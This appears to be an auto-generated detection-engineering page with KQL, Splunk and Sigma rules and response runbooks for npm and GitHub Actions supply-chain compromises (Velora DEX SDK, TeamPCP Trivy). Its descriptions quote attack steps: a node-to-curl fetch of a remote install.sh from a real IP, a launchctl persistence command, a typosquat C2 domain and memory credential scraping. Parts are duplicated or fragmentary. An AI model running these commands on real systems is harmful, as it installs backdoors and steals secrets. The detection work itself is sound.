Step 1 (triage): Identify the originating host, user and parent process tree on the matched event; confirm whether @velora-dex/sdk@9.4.1 appears in node_modules, package-lock.json or yarn.lock on the host. Step 2 (contain): Isolate the device, kill the launchctl-registered zsh.profiler service (launchctl remove zsh.profiler), delete ~/Library/Application Support/com.apple.Terminal/profiler, and rotate all developer credentials, SSH keys, npm tokens, cloud CLI tokens, and browser-stored secrets reachable from that host. Step 3 (hunt): Pivot org-wide on the IOC IP and the three URL paths, and query package manifests across all repos and developer endpoints for @velora-dex/sdk version 9.4.1.

| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessParentFileName, RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessAccountName

node process spawning bash/curl chain to fetch Velora DEX install.sh dropper AIDelivery High
Detects the require()-time payload that prepends three lines to dist/index.js of @velora-dex/sdk@9.4.1 — node spawns /bin/sh -> base64 -> bash -> curl http://89.36.224.5/troubleshoot/mac/install.sh. The base64 blob and the install.sh URL are both unique fingerprints. Rationale: Anchored on two extremely unique strings from the article body: the exact base64 blob prepended to dist/index.js and the exact URL it decodes to. Both strings have no legitimate use anywhere on Earth — a single hit is a confirmed compromise. Also catches the post-decode bash + curl execution branch. Cross-checked against: • https://www.stepsecurity.io/blog/velora-dex-sdk-compromised-on-npm-malicious-version-drops-macos-backdoor-via-launchctl-persistence
ATT&CKT1059.004 T1140 T1105
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Reverse-engineer running the sample inside a tracked malware analysis sandbox
  • Security researcher copy-pasting the IOC into a notepad-style logger app
  • Threat-hunter testing the YARA/Sigma signature against a known-bad sample
  • CTI team replaying the StepSecurity Harden-Runner replay run for training
Suppression filter
| where not (InitiatingProcessFolderPath has_any ("/Applications/CrowdStrike","/Library/Application Support/Microsoft/MDATP") )
Response runbook
Step 1 (triage): Pull the full process tree on the host (node -> sh -> base64 -> bash -> curl); confirm the originating Node.js project and which package.json declares @velora-dex/sdk. Step 2 (contain): Kill the live node process, isolate the device, remove the @velora-dex/sdk dependency and pin to 9.4.0, and treat all secrets the host could reach (cloud tokens, SSH keys, browser cookies, GitHub PATs) as compromised — rotate immediately. Step 3 (hunt): Sweep all developer endpoints and CI runners for the base64 string and install.sh URL via the same query, and scan package-lock.json / yarn.lock files in source control for the malicious version.

launchctl persistence registering zsh.profiler service from non-admin location AIInstallation High
Detects the persistence step of the @velora-dex/sdk@9.4.1 backdoor — `launchctl submit -l zsh.profiler -- $HOME/Library/Application Support/com.apple.Terminal/profiler`. The unique label `zsh.profiler` and the masquerade path are both article-specific fingerprints that survive across reboots. Rationale: Verbatim from the article's install.sh body: `launchctl submit -l zsh.profiler -- "$PROFILER_PATH"` where $PROFILER_PATH=$HOME/Library/Application Support/com.apple.Terminal/profiler. The label string `zsh.profiler` does not appear in any Apple-supplied launchd plist. The IOC list at the end of the article re-confirms both the service label and the filesystem path. Cross-checked against: • https://www.stepsecurity.io/blog/velora-dex-sdk-compromised-on-npm-malicious-version-drops-macos-backdoor-via-launchctl-persistence
ATT&CKT1543.004 T1036.005
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Developer manually registering a personal background job they happened to call profiler (extremely unlikely with this exact label)
  • Mac admin troubleshooting Terminal.app preferences
  • Security researcher detonating the sample in an enrolled analysis lab
  • Red-team exercise replicating this exact persistence TTP
Response runbook
Step 1 (triage): Confirm the device user, the parent process tree of launchctl (should be bash invoking install.sh), and that the file at ~/Library/Application Support/com.apple.Terminal/profiler exists. Step 2 (contain): On the affected Mac run `launchctl remove zsh.profiler`, kill the running profiler PID, delete the binary and its parent directory, and isolate the host from the network. Step 3 (hunt): Sweep every macOS endpoint for the `zsh.profiler` launchctl label and the file path, and use osquery `launchd` and `file` tables to scan the fleet retrospectively.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName =~ "launchctl"
| where ProcessCommandLine has "submit"
| where ProcessCommandLine has_any ("zsh.profiler","com.apple.Terminal/profiler","Library/Application Support/com.apple.Terminal/profiler")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName,
          InitiatingProcessCommandLine, ProcessCommandLine
| order by Timestamp desc
union isfuzzy=true
  (ImProcessCreate
    | where TimeGenerated > ago(30d)
    | where ActingProcessName has "launchctl" or TargetProcessName has "launchctl"
    | where TargetProcessCommandLine has "submit"
    | where TargetProcessCommandLine has_any ("zsh.profiler","com.apple.Terminal/profiler")
    | project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, TargetProcessCommandLine),
  (Syslog
    | where TimeGenerated > ago(30d)
    | where ProcessName has "launchctl"
    | where SyslogMessage has_any ("zsh.profiler","com.apple.Terminal/profiler")
    | project TimeGenerated, Computer, ProcessName, SyslogMessage)
| order by TimeGenerated desc

macOS file write of profiler binary to com.apple.Terminal masquerade path AIInstallation High
Detects the architecture-specific Mach-O binary drop at ~/Library/Application Support/com.apple.Terminal/profiler from the @velora-dex/sdk@9.4.1 install.sh dropper. The path mimics a legitimate Terminal.app support directory and the writing process is curl or bash spawned by node — a high-fidelity combination. Rationale: The path string `~/Library/Application Support/com.apple.Terminal/profiler` and the file name `profiler` are both explicitly listed in the IOC block at the end of the article and visible in the install.sh body. Apple's actual Terminal.app does not create a `profiler` file in that directory — any write there is high-confidence malicious. Cross-checked against: • https://www.stepsecurity.io/blog/velora-dex-sdk-compromised-on-npm-malicious-version-drops-macos-backdoor-via-launchctl-persistence
ATT&CKT1036.005 T1105
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security researcher detonating the sample on an enrolled lab Mac
  • Red-team operator deliberately recreating the dropper for purple-team
  • Backup/restore tool reinstating a previously infected user profile
  • File-integrity-monitoring agent replaying historical events into a test SIEM
Response runbook
Step 1 (triage): Capture the writing process tree (expect curl or bash spawned by node) and the file SHA256 — submit to VT and internal sandbox. Step 2 (contain): Isolate the host, `launchctl remove zsh.profiler`, delete the file and its parent directory, and revoke any cloud / SSH / npm / GitHub tokens reachable from the host. Step 3 (hunt): Sweep all macOS endpoints for the exact path and for any Mach-O binaries under com.apple.* support directories that aren't on Apple's known baseline; pivot on the SHA256 once obtained.
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType in ("FileCreated","FileRenamed","FileModified")
| where FolderPath has "Library/Application Support/com.apple.Terminal"
| where FileName =~ "profiler"
| project Timestamp, DeviceName, ActionType, FolderPath, FileName, SHA256,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessParentFileName, InitiatingProcessAccountName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where EventType in ("FileCreated","FileModified","FileRenamed","FileCreate")
| where TargetFilePath has "Library/Application Support/com.apple.Terminal"
| where TargetFileName =~ "profiler"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine,
          TargetFilePath, TargetFileName, TargetFileSHA256
| order by TimeGenerated desc

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium

Behind the Scenes: How StepSecurity Detected and Helped Remediate the Largest npm Supply Chain Attack

StepSecurity
2026-04-09 8 use cases 3 techniques 5 kill-chain phases detected

StepSecurity's AI Package Analyst and Harden-Runner detected the compromise of axios, the largest npm supply chain attack on a single package by download count, before any public disclosure existed. What followed was a race against a state-sponsored threat actor who actively deleted GitHub issues to suppress the warning, a decision to host a community call at midnight that drew 200 attendees, and coverage from Bloomberg to Andrej Karpathy

Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Microsoft Teams external-tenant chat from unverified IT-helpdesk impersonator
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Behind the Scenes: How StepSecurity Detected and Helped Remediate the Largest np
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] TeamPCP sysmon.py systemd-user persistence on developer host · RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] TeamPCP Trivy/KICS C2 callback to scan.aquasecurtiy.org / 45.148.10.212 · Beaconing — periodic outbound to small set of destinations
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Read of /proc/<pid>/mem targeting GitHub Runner.Worker (TeamPCP credential dump)
TeamPCP Trivy/KICS C2 callback to scan.aquasecurtiy.org / 45.148.10.212 AICommand & Control Medium
Hunts for any network egress (DNS resolution, HTTP POST, raw TCP) to the typosquat C2 used by the compromised aquasecurity/trivy-action (v0.0.1 through v0.34.2) and Checkmarx KICS GitHub Actions, attributed to threat group TeamPCP (CVE-2026-33634). A single hit on this domain or IP from a GitHub Actions self-hosted/ARC runner or developer host is a near-certain compromise indicator because the domain is a typosquat with no legitimate use case. Rationale: Domain scan.aquasecurtiy.org (typosquat — note the swapped 'urtiy' vs legitimate 'urity') and IP 45.148.10.212 are explicit IOCs in the StepSecurity article and cross-confirmed by Wiz, Aqua advisory GHSA-69fq-xp46-6x23, Microsoft Security blog, CrowdStrike, and Snyk write-ups of the same TeamPCP campaign. No legitimate workflow ever resolves this typosquat, so a single hit is high-fidelity. Cross-checked against: • https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23 • https://www.wiz.io/blog/trivy-compromised-teampcp-supply-chain-attack • https://www.microsoft.com/en-us/security/blog/2026/03/24/detecting-investigating-defending-against-trivy-supply-chain-compromise/ • https://www.crowdstrike.com/en-us/blog/from-scanner-to-stealer-inside-the-trivy-action-supply-chain-compromise/ • https://www.aquasec.com/blog/trivy-supply-chain-attack-what-you-need-to-know/

Read of /proc/<pid>/mem targeting GitHub Runner.Worker (TeamPCP credential dump) AIActions on Objectives High
Hunts for a process opening /proc/<pid>/mem on a Linux GitHub Actions runner — the exact behaviour the trivy-action and KICS payloads used to scrape secrets from the Runner.Worker process before exfiltrating to TeamPCP C2. /proc/<pid>/mem cross-process reads have no legitimate use case in standard CI/CD pipelines, and the article specifically names this as the unique runtime signal. Rationale: The StepSecurity article explicitly names the unique runtime signal: "the malware spawned a Python process that read /proc/pid/mem of the GitHub Actions Runner.Worker process to extract marked secrets from memory." Cross-process /proc/<pid>/mem reads outside debugger tooling are virtually unheard of in normal CI/CD workloads — corroborated by Wiz, Aqua advisory GHSA-69fq-xp46-6x23, and Microsoft Defender guidance on the same campaign which all flag this as the canonical TTP. Path regex anchors `/proc/<numeric pid>/mem` to avoid matching unrelated /proc paths. Cross-checked against: • https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23 • https://www.wiz.io/blog/trivy-compromised-teampcp-supply-chain-attack • https://www.microsoft.com/en-us/security/blog/2026/03/24/detecting-investigating-defending-against-trivy-supply-chain-compromise/ • https://www.crowdstrike.com/en-us/blog/from-scanner-to-stealer-inside-the-trivy-action-supply-chain-compromise/
ATT&CKT1003.007 T1552.001 T1195.002
Data sourcesEndpoint.Filesystem Endpoint.Processes
// Defender for Endpoint on Linux — read of /proc/<pid>/mem
let legit_debuggers = dynamic(["gdb","strace","ltrace","crash","perf","makedumpfile","criu","systemd-coredump"]);
DeviceFileEvents
| where Timestamp > ago(30d)
| where DeviceName !startswith "WIN"
| where (FolderPath matches regex @"^/proc/[0-9]+$" and FileName =~ "mem")
     or (FolderPath matches regex @"^/proc/[0-9]+/mem$")
     or (FileName =~ "mem" and FolderPath has "/proc/")
| where InitiatingProcessFileName !in~ (legit_debuggers)
| project Timestamp, DeviceName, DeviceId, FolderPath, FileName,
          InitiatingProcessFileName, InitiatingProcessFolderPath,
          InitiatingProcessCommandLine, InitiatingProcessParentFileName,
          InitiatingProcessAccountName
| join kind=leftouter (
    DeviceProcessEvents
    | where Timestamp > ago(30d)
    | where ProcessCommandLine has_any ("Runner.Worker","/proc/","trivy-action","aquasecurity","kics")
    | project DeviceId, CtxTime=Timestamp, CtxCmd=ProcessCommandLine, CtxFile=FileName
  ) on DeviceId
| order by Timestamp desc
// ASIM file events — read of /proc/<pid>/mem on Linux runners
let legit_debuggers = dynamic(["gdb","strace","ltrace","crash","perf","makedumpfile","criu","systemd-coredump"]);
union isfuzzy=true
( ImFileEvent
    | where TimeGenerated > ago(30d)
    | where TargetFilePath matches regex @"^/proc/[0-9]+/mem$"
    | where ActingProcessName !in~ (legit_debuggers)
    | project TimeGenerated, DvcHostname, ActorUsername, TargetFilePath,
              ActingProcessName, ActingProcessCommandLine, EventType ),
( Syslog
    | where TimeGenerated > ago(30d)
    | where Facility in~ ("auth","authpriv","daemon","kern","user")
    | where SyslogMessage matches regex @"/proc/[0-9]+/mem"
    | where SyslogMessage !has "gdb" and SyslogMessage !has "strace"
    | project TimeGenerated, Computer, HostIP, ProcessName, SyslogMessage )
| order by TimeGenerated desc

description: Detects a process opening /proc/<pid>/mem of another process on Linux. Used by the TeamPCP-compromised aquasecurity/trivy-action and Checkmarx KICS GitHub Actions (CVE-2026-33634) to dump secrets from the Runner.Worker process.

TeamPCP sysmon.py systemd-user persistence on developer host AIInstallation High
Hunts for creation of the persistence dropper sysmon.py under ~/.config/systemd/user/ — the post-execution artefact left on developer machines that ran a malicious local Trivy binary as part of the TeamPCP campaign (CVE-2026-33634). The filename and path are explicit IOCs published in the follow-up StepSecurity / Aqua advisories and are unique to this campaign. Rationale: Article and cross-vendor follow-ups specifically name the post-execution persistence dropper at ~/.config/systemd/user/sysmon.py installed by the TeamPCP trojanised Trivy binary on developer hosts. The path+filename combination is unique to this campaign — no benign software writes sysmon.py to a per-user systemd unit directory — making this a near-zero-FP file-create signal. Corroborated in the StepSecurity follow-up (second compromise post), Aqua advisory, and Halcyon/Phoenix Security write-ups. Cross-checked against: • https://www.stepsecurity.io/blog/trivy-compromised-a-second-time---malicious-v0-69-4-release • https://www.aquasec.com/blog/trivy-supply-chain-attack-what-you-need-to-know/ • https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23 • https://www.wiz.io/blog/trivy-compromised-teampcp-supply-chain-attack
ATT&CKT1543.002 T1546 T1195.002
Data sourcesEndpoint.Filesystem
// Creation of sysmon.py under ~/.config/systemd/user/ (TeamPCP persistence)
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where FolderPath has @"/.config/systemd/user"
| where FileName =~ "sysmon.py"
   or (FileName endswith ".service" and FileName has "sysmon")
| project Timestamp, DeviceName, DeviceId, ActionType, FolderPath, FileName, SHA256,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, InitiatingProcessAccountName
| join kind=leftouter (
    DeviceProcessEvents
    | where Timestamp > ago(30d)
    | where ProcessCommandLine has_any ("trivy","aquasecurity","setup-trivy")
    | summarize TrivyExecCount=count(), LastTrivyExec=max(Timestamp) by DeviceId
  ) on DeviceId
| order by Timestamp desc
// ASIM ImFileEvent — sysmon.py systemd-user persistence dropper

       or (SyslogMessage has "systemd" and SyslogMessage has "sysmon.py")

| order by TimeGenerated desc
title: TeamPCP sysmon.py Systemd User Persistence Dropper
id: f4d2a17b-9c83-4e15-b6d8-2a91f7e3c4d5
description: Detects creation of the persistence file ~/.config/systemd/user/sysmon.py left by the TeamPCP credential stealer that piggy-backed on the compromised aquasecurity/trivy and trivy-action distribution (CVE-2026-33634). Filename and path are unique IOCs published by StepSecurity and Aqua Security.
references:
  - https://www.stepsecurity.io/blog/behind-the-scenes-how-stepsecurity-detected-and-helped-remediate-the-largest-npm-supply-chain-attack
  - https://www.stepsecurity.io/blog/trivy-compromised-a-second-time---malicious-v0-69-4-release
  - https://www.aquasec.com/blog/trivy-supply-chain-attack-what-you-need-to-know/
  - https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23
author: SOC Detection Engineering
date: 2026/05/13
tags:
  - attack.t1543.002
  - attack.t1546
  - attack.t1195.002
  - attack.persistence
logsource:
  product: linux
  category: file_event
detection:
  selection_pyfile:
    TargetFilename|endswith: '/.config/systemd/user/sysmon.py'
  selection_unit:
    TargetFilename|contains|all:
      - '/.config/systemd/user/'
      - 'sysmon'
    TargetFilename|endswith: '.service'
  condition: selection_pyfile or selection_unit
falsepositives:
  - None known; filename is unique to the TeamPCP campaign.
level: critical
source:(linux.auditd OR linux.syslog) AND (@file.path:(*/.config/systemd/user/sysmon.py OR */.config/systemd/user/*sysmon*.service) OR @auditd.path:(*/.config/systemd/user/sysmon.py OR */.config/systemd/user/*sysmon*.service) OR @TargetFilename:(*/.config/systemd/user/sysmon.py))

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
Microsoft Teams external-tenant chat from unverified IT-helpdesk impersonator Delivery High
External Teams chat where displayName contains 'helpdesk' or 'IT support' — common 2024+ vishing pattern (Storm-1811, Black Basta, UNC6692). No CIM data model maps to Teams chats; uses raw O365 audit logs.
ATT&CKT1566.004 T1566
Data sourcesCloudAppEvents
CloudAppEvents
| where Timestamp > ago(7d)
| where Application == "Microsoft Teams"
| where ActionType == "MessageSent"
| where RawEventData has "ExternalParticipants"
| extend SenderDisplayName = tostring(parse_json(RawEventData).SenderDisplayName)
| where SenderDisplayName matches regex @"(?i)(help.?desk|it.?support|service.?desk|tech.?support|admin)"
| project Timestamp, AccountDisplayName, IPAddress, ActivityType, SenderDisplayName, RawEventData
// External Teams chat — Teams audit lives in OfficeActivity.
OfficeActivity
| where TimeGenerated > ago(7d)
| where OfficeWorkload == "MicrosoftTeams"
| where Operation in~ ("MessageSent","ChatCreated","TeamsImpersonationDetected")
| where isnotempty(UserId)
| where Subject has_any ("IT","helpdesk","support","password","verify")
   or Recipients has_any ("IT","helpdesk")
| project TimeGenerated, UserId, Operation, Subject, Recipients,
          ClientIP, UserAgent
| order by TimeGenerated desc
CLOUD
`o365_management_activity`
  Workload=MicrosoftTeams Operation=MessageSent
  ExternalParticipants=*
| where match(SenderDisplayName, "(?i)(help.?desk|it.?support|service.?desk|tech.?support|admin)")
| stats count, earliest(_time) as firstTime, latest(_time) as lastTime
    by SenderUpn, SenderDisplayName, RecipientUpn, ChatId

Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("AnyDesk.exe","TeamViewer.exe","TeamViewer_Service.exe",
        "ScreenConnect.ClientService.exe","ConnectWiseControl.ClientService.exe",
        "atera_agent.exe","SplashtopStreamer.exe","RustDesk.exe","NinjaOne.exe")
   or FileName matches regex @"(?i)kaseya.*\.exe"

SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where NewProcessName endswith "\AnyDesk.exe"
   or NewProcessName endswith "\TeamViewer.exe"
   or NewProcessName endswith "\TeamViewer_Service.exe"
   or NewProcessName endswith "\ScreenConnect.ClientService.exe"
   or NewProcessName endswith "\ConnectWiseControl.ClientService.exe"
   or NewProcessName endswith "\atera_agent.exe"
   or NewProcessName endswith "\SplashtopStreamer.exe"

title: Remote-Management (RMM) Tool Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0c

description: |

date: 2026/05/02
tags:
    - attack.t1219
    - attack.command-and-control

    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\AnyDesk.exe'
            - '\TeamViewer.exe'

            - '\ConnectWiseControl.ClientService.exe'
            - '\atera_agent.exe'
            - '\SplashtopStreamer.exe'
            - '\RustDesk.exe'
            - '\NinjaOne.exe'
    condition: selection
falsepositives:
    - IT-approved RMM in use across the estate. Maintain a known-IT-
      tool exclusion list per environment.
level: high

        "ScreenConnect.ClientService.exe","ConnectWiseControl.ClientService.exe",

Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
